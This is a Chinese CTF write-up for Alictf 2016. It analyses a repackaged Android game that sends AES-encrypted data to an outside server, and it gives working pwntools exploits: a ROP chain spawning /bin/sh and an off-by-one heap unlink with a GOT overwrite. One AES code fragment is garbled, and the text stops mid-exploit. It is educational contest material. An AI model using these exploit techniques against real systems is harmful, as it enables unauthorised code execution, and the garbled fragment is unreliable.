[Nu1L] writup-for-Alictf-2016 
MISC 
coloroverflow 
首先感觉这种包名不像是 CTF 用的，所以直接 Google 之，发现是 Google Play 上开源的游戏
Color Overflow。于是下载下来进行比对，发现多出了几个类无法匹配上原 apk，所以猜测是
自己后加的。分别将多出的类分析之后，发现分别是用语发送请求、生成请求和工具类。我
将其命名为 LogClass、n 和 Utils 
程序将请求生成之后向 log.godric.me 发送 POST 请求，在代码里发现数据发送之前用经过了
GZIP 压缩。在 pcap 中，也发现了这个请求，pcap 里显示确实有 Content-Encoding: gzip。用
wireshark 导出 http 数据得到了原始数据。 
现 在 从
LogClass
往 上 找 ， 发 现
GameView$1
里 的
new LogClass().execute(new 
ByteArrayOutputStream[]{v2.OutputRequestBody()});会调用 n 中的方法。然后 LogClass 里的 run
会发送。 
    public ByteArrayOutputStream OutputRequestBody() { 
        try { 
            this.output_stream.reset(); 
            f.a(this.output_stream, this.szId); 
            f.a(this.output_stream, this.CurMill); 
            f.a(this.output_stream, this.Rand); 
            f.a(this.output_stream, this.d); 
            this.output_stream.flush(); 
        } 
        catch(Exception v0) { 
            v0.printStackTrace(); 
        } 
        return this.output_stream; 
    } 
其中 d 是由要发送的数据进行 AES 加密后得到的，在 GetRequestBody 这个方法中。 
这部分缓存了要发送的数据。a 方法有三个重载，都将输出到缓冲区。分别会先输出对应的
类型标志，21、18 和 24。接下来，字符串类型会字符串长度，然后输出字符串；字节数组
会输出一个字节表示长度，然后输出所有字节；长整型会按 7 位分组然后高位作为结尾标
志，每次输出一个字节，高位为 0 表示结束。 
因此我们可以从 pcap 导出的数据中还原出 szId, CurMil, Rand, d。 
szId 被计算 MD5 后，摘要作为 key（未编码成十六进制字符串），Rand 和 CurMill 进行循环
异或得到 IV。因此 key 和 IV 也可以计算出来。 
再来看 AES： 
            if(i == 0) { 
                int j; 
                for(j = 0; j > (i*8)) & 255 for i in range(8)][::-1] 
IV = [rand[i] ^ IV[i%8] for i in range(len(rand))] 
IV = ''.join(map(chr, IV)) 
print 'IV', map(ord, IV) 
with open('encrypted') as f: 
    encrypted = f.read() 
from Crypto.Cipher import AES 
aes_d = AES.new(key, AES.MODE_CBC, IV) 
print aes_d.decrypt(encrypted) 
PWN 
Vss 
存在一个栈溢出，输入的第 0x48-0x50 个字节刚好覆盖返回地址，用 ROPgadget 找到一个
ropchain，由于第 0x48-0x50 个字节是返回地址，再找一个 add rsp ret 的 gadget 增加 rsp 的
地址就可以返回到 ropchain 
from pwn import * 
from struct import pack 
p = remote('121.40.56.102', 2333) 
recv_content = p.recvuntil('Password:\n') 
p2 = '' 
p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret 
p2 += pack('<Q', 0x00000000006c4080) # @ .data 
p2 += pack('<Q', 0x000000000046f208) # pop2 rax ; ret 
p2 += '/bin//sh' 
p2 += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret 
p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret 
p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8 
p2 += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret 
p2 += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret 
p2 += pack('<Q', 0x0000000000401823) # pop2 rdi ; ret 
p2 += pack('<Q', 0x00000000006c4080) # @ .data 
p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret 
p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8 
p2 += pack('<Q', 0x000000000043ae05) # pop2 rdx ; ret 
p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8 
p2 += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret 
p2 += pack('<Q', 0x000000000045f2a5) # syscall ; ret 
payload1 = 'py' + 'B' * (0x4e - 0x8) + p64(0x000000000044892a) + 'A' * (0xd0 - 0x50) + p2 
p.sendline(payload1) 
p.interactive() 
fb 
教科书一般的 off-by-one 
脚本： 
#!/usr/bin/env python2 
# -*- coding:utf-8 -*- 
from pwn import * 
import os 
# flag : alictf{FBfbFbfB23666} 
# switches 
DEBUG = 0 
# modify this 
''' 
if DEBUG: 
    io = process('./fb') 
else: 
    io = remote('121.40.56.102',9733) 
''' 
if DEBUG: context(log_level='debug') 
# define symbols and offsets here 
# simplified r/s function 
def ru(delim): 
    return io.recvuntil(delim) 
def rn(count): 
    return io.recvn(count) 
def sl(data): 
    return io.sendline(data) 
def sn(data): 
    return io.send(data) 
def info(string): 
    return log.info(string) 
# define interactive functions here 
def menu(): 
    return ru('Choice:') 
def addmsg(length): 
    menu() 
    sl('1') 
    ru(':') 
    sl(str(length)) 
    return 
def setmsg(index,content): 
    menu() 
    sl('2') 
    ru(':') 
    sl(str(index)) 
    ru(':') 
    sl(content) 
    return 
def delmsg(index): 
    menu() 
    sl('3') 
    ru(':') 
    sl(str(index)) 
    return 
def leak(addr): 
    if '\x0a' in p64(addr): return '\x00'    # :< 
    setmsg(1, p64(addr) + p32(100)) 
    delmsg(2) 
    buf = ru('Done').rstrip('Done') 
    if len(buf) == 0:   return '\x00' 
    return buf + '\x00' 
printf = 0x4006E0 
ptr = 0x6020c0 
ptr2 = 0x6020e0 
freegot = 0x602018 
# define exploit function here 
def pwn(): 
    if DEBUG: gdb.attach(io) 
    #elf = ELF('./fb') 
    addmsg(248) 
    addmsg(240)     # xxx 
    addmsg(256) 
    addmsg(248) 
    addmsg(240) 
    addmsg(256) 
    addmsg(256) 
    addmsg(256) 
    setmsg(7, '%17$p') 
    payload = '' 
    payload += p64(0) + p64(0xf1) 
    payload += p64(ptr-0x18) + p64(ptr-0x10) 
    payload = payload.ljust(240, '\x00') 
    payload += p64(0xf0) 
    setmsg(0,payload) 
    delmsg(1) 
    payload2 = p64(0) + p32(0) + p32(16) + p64(0) + p64(freegot) + 
p64(2000) + p64(0x6020e0) + p32(0x1000) 
    setmsg(0, payload2) 
    setmsg(0, p64(printf)[:-1]) 
    delmsg(7) 
    buf = ru('Done').rstrip('Done').lstrip('0x') 
    libc_start_main_ret = int(buf, 16) 
    #info('Libc leaked = ' + hex(libc_start_main_ret)) 
    libc = libc_start_main_ret - 0x21f45 